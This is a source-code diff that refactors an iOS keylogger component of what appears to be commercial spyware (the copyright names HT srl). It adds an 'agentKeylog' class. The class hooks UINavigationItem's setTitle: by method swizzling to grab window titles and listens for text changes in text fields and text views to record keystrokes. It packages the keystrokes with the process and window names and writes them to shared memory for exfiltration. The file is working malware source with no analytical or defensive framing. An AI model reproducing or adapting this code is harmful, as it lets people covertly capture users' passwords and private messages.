@@ -6,9 +6,10 @@
  * Copyright (C) HT srl 2010. All rights reserved
  *
  */
+#import <objc/runtime.h>
 
 #import "RCSIAgentInputLogger.h"
-#import "RCSILoader.h"
+#import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
 //#define DEBUG
@@ -17,28 +18,9 @@ static NSString *gWindowTitle      = nil;
 static NSLock   *gKeylogLock       = nil;
 u_int gPrevStringLen               = 0;
 
+@implementation agentKeylog
 
-@implementation RCSIKeyLogger
-
-@synthesize mContextHasBeenSwitched;
-
-- (id)init
-{
-  self = [super init];
-  
-  if (self != nil)
-    {
-      gKeylogLock = [[NSLock alloc] init];
-      mContextHasBeenSwitched = TRUE;
-    }
-  return self;
-}
-
-- (void)dealloc
-{
-  [gKeylogLock release];
-  [super dealloc];
-}
+#define CONTEXT_MANDATORY 0xFFFF0000;
 
 - (void)keyPressed: (NSNotification *)aNotification
 {
@@ -46,7 +28,7 @@ u_int gPrevStringLen               = 0;
     {
       mBufferString = [[NSMutableString alloc] init];
     }
-    
+  
   NSString *_fullText   = [[aNotification object] text];
   NSString *_singleChar;
   
@@ -66,10 +48,10 @@ u_int gPrevStringLen               = 0;
       switch (*(char *)_cChar)
         {
           case 0xa: // Enter
-            _singleChar = @"\u21B5\r\n";
-            break;
+          _singleChar = @"\u21B5\r\n";
+          break;
           default:
-            break;
+          break;
         }
       
       // Backspace
@@ -81,30 +63,22 @@ u_int gPrevStringLen               = 0;
       if ([mBufferString length] < KEY_MAX_BUFFER_SIZE)
         {
           [mBufferString appendString: _singleChar];
-#ifdef DEBUG
-          NSLog(@"singleChar: %@ hex %x", _singleChar, *(unsigned int *)_cChar);
-#endif
         }
       else
         {
-#ifdef DEBUG
-          NSLog(@"[keylogger] Logging: %@", mBufferString);
-#endif
           logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
           NSMutableData *entryData = [[NSMutableData alloc] init];
           
           shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
           shMemoryHeader->flag  = 0;
           short unicodeNullTerminator = 0x0000;
-        
-#define CONTEXT_MANDATORY 0xFFFF0000;
-
+          
           if (mContextHasBeenSwitched == TRUE)
             {
               mContextHasBeenSwitched = FALSE;
               shMemoryHeader->flag  = CONTEXT_MANDATORY;
             }
-
+          
           NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
           NSString *_processName      = [[processInfo processName] copy];
           
@@ -113,7 +87,7 @@ u_int gPrevStringLen               = 0;
           
           processName  = [[NSMutableData alloc] initWithData:
                           [_processName dataUsingEncoding:
-                          NSUTF16LittleEndianStringEncoding]];
+                           NSUTF16LittleEndianStringEncoding]];
           
           // Dummy word
           short dummyWord = 0x0000;
@@ -139,13 +113,9 @@ u_int gPrevStringLen               = 0;
           [entryData appendBytes: &unicodeNullTerminator
                           length: sizeof(short)];
           
-          //_windowName = [self title];
-          //_windowName = @"EMPTY";
-          
           [gKeylogLock lock];
           
-          if ([gWindowTitle isEqualToString: @""]
-              || gWindowTitle == nil)
+          if ([gWindowTitle isEqualToString: @""] || gWindowTitle == nil)
             {
               windowName = [[NSMutableData alloc] initWithData:
                             [@"EMPTY" dataUsingEncoding:
@@ -170,14 +140,14 @@ u_int gPrevStringLen               = 0;
           unsigned long del = DELIMETER;
           [entryData appendBytes: &del
                           length: sizeof(del)];
-                          
+          
           shMemoryHeader->flag  |= ([entryData length] & 0x0000FFFF);
           
           [processName release];
           [_processName release];
           [windowName release];
-
-        
+          
+          
           contentData = [[NSMutableData alloc] initWithData:
                          [mBufferString dataUsingEncoding:
                           NSUTF16LittleEndianStringEncoding]];
@@ -200,21 +170,8 @@ u_int gPrevStringLen               = 0;
                  [entryData bytes],
                  [entryData length]);
           
-          if ([mSharedMemoryLogging writeMemory: logData 
-                                         offset: 0
-                                  fromComponent: COMP_AGENT] == TRUE)
-            {
-#ifdef DEBUG
-              NSLog(@"Logged: %@", mBufferString);
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_ERRORS
-              NSLog(@"Error while logging keystrokes to shared memory");
-#endif
-            }
-          
+          [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
+        
           [mBufferString release];
           [logData release];
           [entryData release];
@@ -223,23 +180,15 @@ u_int gPrevStringLen               = 0;
           mBufferString = [[NSMutableString alloc] init];
           [mBufferString appendString: _singleChar];
         }
-        
+    
       gPrevStringLen = [_fullText length];
     }
 }
 
-@end
-
-@implementation myUINavigationItem : NSObject
-
-// Just to avoid compiler warnings
-- (id)title
-{
-  return nil;
-}
-
 - (void)setTitleHook: (NSString *)arg1
 {
+  [self setTitleHook: arg1];
+  
   [gKeylogLock lock];
   
   if (gWindowTitle != nil && [gWindowTitle isKindOfClass: [NSString class]])
@@ -247,7 +196,6 @@ u_int gPrevStringLen               = 0;
       if ([gWindowTitle isEqualToString: arg1] == FALSE)
         {
           [gWindowTitle release];
-          
           gWindowTitle = [arg1 copy];
         }
     }
@@ -255,9 +203,81 @@ u_int gPrevStringLen               = 0;
     {
       gWindowTitle = [arg1 copy];
     }
-    
+  
   [gKeylogLock unlock];
-  [self setTitleHook: arg1];
+
+}
+
+- (id)init
+{
+  self = [super init];
+  
+  if (self != nil)
+    mAgentID = AGENT_KEYLOG;
+  
+  return self;
+}
+
+- (BOOL)start
+{
+  BOOL retVal = TRUE;
+  
+  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
+    {
+      Class className   = objc_getClass("UINavigationItem");
+      Class classSource = [self class];
+      
+      if (className != nil)
+        {
+          IMP newImpl = class_getMethodImplementation(classSource, @selector(setTitleHook:));          
+          [self swizzleByAddingIMP:className 
+                           withSEL:@selector(setTitle:) 
+                    implementation:newImpl
+                      andNewMethod:@selector(setTitleHook:)];
+          
+          /*
+           * checking for a valid method swapping before return OK
+           * [self validateHook];
+           */
+          
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(keyPressed:)
+                                                       name: UITextFieldTextDidChangeNotification
+                                                     object: nil];
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(keyPressed:)
+                                                       name: UITextViewTextDidChangeNotification
+                                                     object: nil];
+          
+          [self setMAgentStatus: AGENT_STATUS_RUNNING];
+        }
+    }
+  return retVal;
+}
+
+- (void)stop
+{
+  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
+    {
+      Class className = objc_getClass("UINavigationItem");
+      
+      if (className != nil)
+        {
+          IMP   oldImpl = class_getMethodImplementation(className, @selector(setTitleHook:));
+          [self swizzleByAddingIMP:className 
+                          withSEL:@selector(setTitle:) 
+                    implementation:oldImpl
+                      andNewMethod:@selector(setTitleHook:)];
+          /*
+           * checking for a valid method swapping before return OK
+           * [self validateHook];
+           */
+          
+          [[NSNotificationCenter defaultCenter] removeObserver: self];
+        
+          [self setMAgentStatus: AGENT_STATUS_STOPPED];
+        } 
+    }
 }
 
 @end
